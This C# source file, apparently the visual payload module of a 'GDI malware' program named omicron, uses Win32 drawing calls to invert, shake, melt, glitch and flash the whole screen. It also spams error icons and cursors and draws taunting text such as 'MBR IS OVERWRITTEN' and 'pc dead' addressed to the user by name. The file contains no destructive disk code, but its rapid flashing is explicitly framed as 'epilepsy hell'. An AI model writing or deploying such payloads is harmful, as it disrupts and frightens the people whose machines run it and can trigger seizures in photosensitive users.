using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Xml.Serialization;
using System.IO;
using static System.Net.Mime.MediaTypeNames;
using System.Security.Cryptography;

namespace omicron
{
    internal class gdi
    {
        [STAThread]
        #region imports

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int cx, int cy);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("gdi32.dll")]
        public static extern uint SetBkColor(IntPtr hdc, uint color);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("gdi32.dll", SetLastError = true, EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

        [DllImport("gdi32.dll")]
        public static extern bool Ellipse(IntPtr hdc, int left, int top, int right, int bottom);

        [DllImport("gdi32.dll")]
        public static extern bool TextOutA(IntPtr hdc, int x, int y, string lpString, int c);

        [DllImport("gdi32.dll")]
        public static extern uint SetTextColor(IntPtr hdc, uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateSolidBrush(uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateHatchBrush(int iHatch, uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr DeleteObject(IntPtr ho);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        [DllImport("user32.dll")]
        static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, uint istepIfAniCur, IntPtr hbrFlickerFreeDraw, uint diFlags);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);
        public delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        const uint DI_COMPAT = 0x0004;
        const uint DI_DEFAULTSIZE = 0x0008;
        const uint DI_IMAGE = 0x0002;
        const uint DI_MASK = 0x0001;
        const uint DI_NOMIRROR = 0x0004;
        const uint DI_NORMAL = 0x0004;

        [DllImport("user32.dll")]
        static extern IntPtr LoadIconA(IntPtr hInstance, int lpIconName);

        [DllImport("user32.dll")]
        static extern IntPtr LoadCursor(IntPtr hInstance, int lpCursorName);

        [DllImport("user32.dll")]
        public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        // icons

        static IntPtr IDI_APPLICATION = LoadIconA(IntPtr.Zero, 32512);
        static IntPtr IDI_ERROR = LoadIconA(IntPtr.Zero, 32513);
        static IntPtr IDI_QUESTION = LoadIconA(IntPtr.Zero, 32514);
        static IntPtr IDI_WARNING = LoadIconA(IntPtr.Zero, 32515);
        static IntPtr IDI_INFORMATION = LoadIconA(IntPtr.Zero, 32516);
        static IntPtr IDI_WINLOGO = LoadIconA(IntPtr.Zero, 32517);
        static IntPtr IDI_SHIELD = LoadIconA(IntPtr.Zero, 32518);

        // cursors

        static IntPtr IDC_ARROW = LoadCursor(IntPtr.Zero, 32512);
        static IntPtr IDC_IBEAM = LoadCursor(IntPtr.Zero, 32513);
        static IntPtr IDC_WAIT = LoadCursor(IntPtr.Zero, 32514);
        static IntPtr IDC_CROSS = LoadCursor(IntPtr.Zero, 32515);
        static IntPtr IDC_UPARROW = LoadCursor(IntPtr.Zero, 32516);
        static IntPtr IDC_SIZENWSE = LoadCursor(IntPtr.Zero, 32642);
        static IntPtr IDC_SIZENESW = LoadCursor(IntPtr.Zero, 32643);
        static IntPtr IDC_SIZEWE = LoadCursor(IntPtr.Zero, 32644);
        static IntPtr IDC_SIZENS = LoadCursor(IntPtr.Zero, 32645);
        static IntPtr IDC_SIZEALL = LoadCursor(IntPtr.Zero, 32646);
        static IntPtr IDC_NO = LoadCursor(IntPtr.Zero, 32648);
        static IntPtr IDC_HAND = LoadCursor(IntPtr.Zero, 32649);
        static IntPtr IDC_APPSTARTING = LoadCursor(IntPtr.Zero, 32650);

        // raster operations

        public static uint BLACKNESS = 0x00000042;
        public static uint NOTSRCERASE = 0x001100A6;
        public static uint NOTSRCCOPY = 0x0330008;
        public static uint SRCERASE = 0x00440328;
        public static uint DSTINVERT = 0x00550009;
        public static uint PATINVERT = 0x005A0049;
        public static uint SRCINVERT = 0x00660046;
        public static uint SRCAND = 0x008800C6;
        public static uint MERGEPAINT = 0x00BB0226;
        public static uint MERGECOPY = 0x00C000CA;
        public static uint SRCCOPY = 0x00CC0020;
        public static uint SRCPAINT = 0x00EE0086;
        public static uint PATCOPY = 0x00F00021;
        public static uint PATPAINT = 0x00FB0A09;
        public static uint WHITENESS = 0x00FF0062;
        public static uint NOMIRRORBITMAP = 0x80000000;

        // other variables

        public static IntPtr NULL = IntPtr.Zero;
        public static Random r = new Random();

        #endregion

        public static void invertForegroundWindow()
        {
            while (true)
            {
                IntPtr window = GetDC(GetForegroundWindow());
                GetWindowRect(GetForegroundWindow(), out RECT rect);

                int w = rect.right;
                int h = rect.bottom;

                PatBlt(window, 0, 0, w, h, PATINVERT);
                DeleteDC(window);

                Thread.Sleep(1000);
            }

        }

        public static void windowMess()
        {
            while (true)
            {
                EnumChildWindows(GetDesktopWindow(), new EnumChildProc(doGDI), NULL);
                Thread.Sleep(125);
            }
            bool doGDI(IntPtr hWnd, IntPtr lParam)
            {
                IntPtr hdc = GetDC(hWnd);
                GetWindowRect(hWnd, out RECT rect);
                int w = rect.right;
                int h = rect.bottom;

                BitBlt(hdc, r.Next(-4, 4), r.Next(-4, 4), w, h, hdc, r.Next(-4, 4), r.Next(-4, 4), SRCCOPY);

                DeleteDC(hdc);
                return true;
            }
        }

        public static void iconpayload()
        {
            while (true)
            {
                IntPtr hdc = GetDC(NULL);

                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                int size = r.Next(32, 256);

                DrawIconEx(hdc, r.Next(-size, w), r.Next(-size, h), IDI_ERROR, size, size, 0, NULL, DI_IMAGE | DI_MASK);

                Thread.Sleep(10);
                DeleteDC(hdc);
            }
        }

        #region payload 2

        public static void blur()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mhdc, hbit);

                BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
                AlphaBlend(hdc, r.Next(-5, 5), r.Next(-5, 5), w, h, mhdc, 0, 0, w, h, new BLENDFUNCTION(0, 0, 80, 0));

                Thread.Sleep(20);

                DeleteDC(hdc);
                DeleteDC(mhdc);
                DeleteObject(hbit);
            }
        }

        public static void glitches()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                int rw = r.Next(w);
                int rh = r.Next(h);

                IntPtr hdc = GetDC(NULL);

                BitBlt(hdc, rw, r.Next(-12, 12), r.Next(600), h, hdc, rw, r.Next(-12, 12), SRCCOPY);
                BitBlt(hdc, r.Next(-12, 12), rh, w, r.Next(600), hdc, r.Next(-12, 12), rh, SRCCOPY);

                Thread.Sleep(2);

                DeleteDC(hdc);
            }
        }

        public static void clearloop()
        {
            while (true)
            {
                InvalidateRect(NULL, NULL, true);
                Thread.Sleep(400);
            }
        }

        #endregion

        #region payload 3

        public static void shake()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                BitBlt(hdc, r.Next(-4, 4), r.Next(-4, 4), w, h, hdc, r.Next(-4, 4), r.Next(-4, 4), SRCCOPY);

                Thread.Sleep(20);

                DeleteDC(hdc);
            }
        }

        public static void hatchbrush()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateHatchBrush(5, colors.Random(200, 255, 200, 255, 200, 255));
                SetBkColor(hdc, colors.Random(128, 255, 128, 255, 128, 255));
                SelectObject(hdc, brush);

                PatBlt(hdc, 0, 0, w, h, PATINVERT);

                Thread.Sleep(40);

                DeleteDC(hdc);
                DeleteObject(brush);
            }
        }

        public static void squares()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                int posx = r.Next(w);
                int posy = r.Next(h);
                int size = 50;

                for (int i = 0; i < r.Next(3, 8); i++)
                {
                    PatBlt(hdc, posx, posy, size, size, PATINVERT);
                    posx -= 50;
                    posy -= 50;
                    size += 100;
                }

                Thread.Sleep(50);

                DeleteDC(hdc);
            }
        }

        public static void cursorDrawer()
        {
            int speed = 10;
            int speedy = 1;
            int[] move = { -speed, speed };
            int direction = 1;
            int x = 0;
            int y = 0;

            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                for (int i = 0; i < 50; i++)
                {
                    DrawIcon(hdc, x, y, IDC_ARROW);

                    if (x >= w) { direction = 0; }
                    if (x <= 0) { direction = 1; }

                    x += move[direction];
                    if (y >= h) { y = 0; } else { y += speedy; }
                }

                Thread.Sleep(5);

                DeleteDC(hdc);
            }
        }

        public static void clearloop1()
        {
            while (true)
            {
                Thread.Sleep(300);
                InvalidateRect(NULL, NULL, true);
            }
        }

        #endregion

        #region payload 4

        public static void scrolling()
        {
            double speed = 1;

            for (int i = 0; i < GetSystemMetrics(1) / 4; i++)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mhdc, hbit);

                BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

                BitBlt(hdc, -(int)speed, -(int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, -(int)speed, h - (int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, w - (int)speed, -(int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, w - (int)speed, h - (int)speed, w, h, mhdc, 0, 0, SRCCOPY);

                Thread.Sleep(6);

                invertColours();
                speed += 0.25;

                DeleteDC(hdc);
                DeleteDC(mhdc);
                DeleteObject(hbit);
            }

            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mhdc, hbit);

                BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

                BitBlt(hdc, -(int)speed, -(int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, -(int)speed, h - (int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, w - (int)speed, -(int)speed, w, h, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, w - (int)speed, h - (int)speed, w, h, mhdc, 0, 0, SRCCOPY);

                invertColours();

                Thread.Sleep(6);

                DeleteDC(hdc);
                DeleteDC(mhdc);
                DeleteObject(hbit);
            }
        }

        public static void invertColours()
        {
            IntPtr hdc = GetDC(NULL);

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            IntPtr brush = CreateSolidBrush(colors.Random(0, 50, 0, 50, 0, 50));
            SelectObject(hdc, brush);

            PatBlt(hdc, 0, 0, w, h, PATINVERT);

            DeleteObject(brush);
        }

        #endregion

        #region payload 5

        public static void icondvdlogo()
        {
            int size = 100;
            int speed = 40;
            int[] move = { -speed, speed };
            int directionx = 1;
            int directiony = 1;
            int x = 0;
            int y = 0;

            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                DrawIconEx(hdc, x, y, IDI_ERROR, size, size, 0, NULL, DI_IMAGE | DI_MASK);

                if (x >= w - size) { directionx = 0; }
                if (x <= 0) { directionx = 1; }
                if (y >= h - size) { directiony = 0; }
                if (y <= 0) { directiony = 1; }

                x += move[directionx];
                y += move[directiony];

                Thread.Sleep(25);

                DeleteDC(hdc);
            }
        }

        public static void hatchbrush1()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mhdc, hbit);
                int[] hbrush = { 2, 3, 5 };
                IntPtr brush = CreateHatchBrush(hbrush[r.Next(hbrush.Length)], colors.Random());
                SetBkColor(hdc, colors.Random(5, 50, 5, 50, 5, 50));
                SelectObject(hdc, brush);

                PatBlt(hdc, 0, 0, w, h, PATINVERT);

                Thread.Sleep(50);

                DeleteDC(hdc);
                DeleteObject(brush);
            }
        }

        #endregion

        #region payload 6

        public static void text()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                SetBkColor(hdc, 0x000000);

                string[] texts =
                {
                        "MBR IS OVERWRITTEN",
                        "g3t r3kt m8",
                        "silverjetes",
                        payloads.GetRandomUnicode(r.Next(10, 50)),
                        "R.I.P Windows",
                        "omicron",
                        "infected",
                        "deep frying",
                        "pc dead",
                        "mbr fried",
                        "registry fried",
                        "system files fried",
                        "Oh, OK, Pigmen!",
                        "Colormatic!",
                        "/give @a hugs 64",
                        "You only have one shot, " + Environment.UserName,
                        "1234567 is a bad password!",
                        "free soloris .exe",
                        "i hope that's vmware (because virtualbox sucks)",
                        "turn it off and on again",
                        "Technoblade never dies!",
                        "C#!",
                        "epilepsy hell",
                        "get gdi overload",
                        "Why do java programmers wear glasses? Because they can't C#!",
                        "printf(\"lmao nice\");",
                        "Console.WriteLine(\"Hello World\");",
                        "public static bool isNikosoftDumb = true;",
                        "OOPS my system crashed! I lost my data, but I had an antivirus!",
                        "Antivirus is not enough - you need PROTEGENT! World's Only Antivirus with Data Recovery Software",
                        "Think beyond antivirus - think PROTEGENT!"
                    };

                for (int i = 0; i < 200; i++)
                {
                    SetTextColor(hdc, colors.Random());
                    int index = r.Next(texts.Length);
                    TextOutA(hdc, r.Next(-300, w), r.Next(h), texts[index], texts[index].Length);
                }
                Thread.Sleep(100);
                clear();

                DeleteDC(hdc);
            }
        }

        public static void paintcolors()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                int ry = r.Next(-500, h);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateSolidBrush(colors.Random());
                SelectObject(hdc, brush);

                BitBlt(hdc, 0, ry, w, r.Next(h), hdc, 0, ry, PATINVERT);

                ry = r.Next(-500, h);

                BitBlt(hdc, r.Next(-10, 10), ry, w, r.Next(600), hdc, r.Next(-10, 10), ry, SRCCOPY);
                BitBlt(hdc, r.Next(-10, 10), ry, w, r.Next(600), hdc, r.Next(-10, 10), ry, SRCCOPY);
                BitBlt(hdc, r.Next(-10, 10), ry, w, r.Next(600), hdc, r.Next(-10, 10), ry, SRCCOPY);

                ry = r.Next(-500, h);

                BitBlt(hdc, 0, ry, w, r.Next(600), hdc, 0, ry, NOTSRCCOPY);

                Thread.Sleep(2);

                DeleteDC(hdc);
            }
        }

        #endregion

        #region payload 7

        public static void ellipse()
        {
            int size = 80;
            int speed = 30;
            int[] move = { -speed, speed };
            int directionx = 1;
            int directiony = 1;
            int x = 0;
            int y = 0;

            int red = r.Next(196, 255);
            int green = r.Next(196, 255);
            int blue = r.Next(196, 255);

            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateSolidBrush(colors.ToHex((byte)red, (byte)green, (byte)blue));
                SelectObject(hdc, brush);

                Ellipse(hdc, x, y, x + size, y + size);

                Thread.Sleep(25);

                DeleteObject(brush);
                IntPtr darkerBrush = CreateSolidBrush(colors.ToHex((byte)(red - 25), (byte)(green - 25), (byte)(blue - 25)));
                SelectObject(hdc, darkerBrush);

                Ellipse(hdc, x, y, x + size, y + size);

                if (x >= w - size) { directionx = 0; changecolorvalues(); }
                if (x <= 0) { directionx = 1; changecolorvalues(); }
                if (y >= h - size) { directiony = 0; changecolorvalues(); }
                if (y <= 0) { directiony = 1; changecolorvalues(); }

                x += move[directionx];
                y += move[directiony];

                DeleteObject(darkerBrush);
                DeleteDC(hdc);

                void changecolorvalues()
                {
                    red = r.Next(196, 255);
                    green = r.Next(196, 255);
                    blue = r.Next(196, 255);
                }
            }
        }

        public static void colorfrying()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateHatchBrush(0, 0x000000);
                SetBkColor(hdc, 0xDDDDDD);
                SelectObject(hdc, brush);

                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY);

                Thread.Sleep(25);

                DeleteObject(brush);
                DeleteDC(hdc);
            }
        }

        public static void melting()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                for (int x = 0; x < w; x++)
                {
                    IntPtr hdc = GetDC(NULL);
                    BitBlt(hdc, x, r.Next(-5, 5), 1, h, hdc, x, r.Next(-5, 5), SRCCOPY);
                    DeleteDC(hdc);
                }

                Thread.Sleep(100);
            }
        }

        #endregion

        #region payload 8

        public static void invert()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateSolidBrush(colors.Random(0, 128, 0, 128, 0, 128));
                SelectObject(hdc, brush);

                PatBlt(hdc, 0, 0, w, h, PATINVERT);

                Thread.Sleep(1);

                DeleteObject(brush);
                DeleteDC(hdc);
            }
        }

        public static void invertHB()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);
                IntPtr brush = CreateHatchBrush(r.Next(6), colors.Random());
                SetBkColor(hdc, colors.Random());
                SelectObject(hdc, brush);

                PatBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), w, h, PATINVERT);

                DeleteObject(brush);
                DeleteDC(hdc);
            }
        }

        public static void shake1()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                BitBlt(hdc, r.Next(-100, 100), r.Next(-100, 100), w, h, hdc, r.Next(-100, 100), r.Next(-100, 100), SRCCOPY);

                DeleteDC(hdc);
            }
        }

        public static void drawIconsAndCursors()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                IntPtr[] cursors =
                {
                    // icons
                    IDI_ERROR,
                    IDI_WARNING,
                    IDI_APPLICATION,
                    IDI_INFORMATION,
                    IDI_QUESTION,
                    IDI_SHIELD,
                    IDI_WINLOGO,
                    // cursors
                    IDC_APPSTARTING,
                    IDC_ARROW,
                    IDC_CROSS,
                    IDC_HAND,
                    IDC_IBEAM,
                    IDC_NO,
                    IDC_SIZEALL,
                    IDC_SIZENWSE,
                    IDC_SIZENESW,
                    IDC_SIZENS,
                    IDC_SIZEWE,
                    IDC_UPARROW,
                    IDC_WAIT
                };

                for (int i = 0; i < 10; i++)
                {
                    DrawIcon(hdc, r.Next(w), r.Next(h), cursors[r.Next(cursors.Length)]);
                }

                Thread.Sleep(1);

                DeleteDC(hdc);
            }
        }

        public static void mess()
        {
            while (true)
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);

                IntPtr hdc = GetDC(NULL);

                Thread.Sleep(1000);
                for (int i = 0; i < 300; i++)
                {
                    int rx = r.Next(w);
                    int ry = r.Next(h);

                    BitBlt(hdc, rx + r.Next(-50, 50), ry + r.Next(-50, 50), 200, 200, hdc, rx, ry, SRCCOPY);
                }
                Thread.Sleep(200);
                clear();

                DeleteDC(hdc);
            }
        }

        #endregion

        public static void clear()
        {
            InvalidateRect(NULL, NULL, true);
        }
    }
}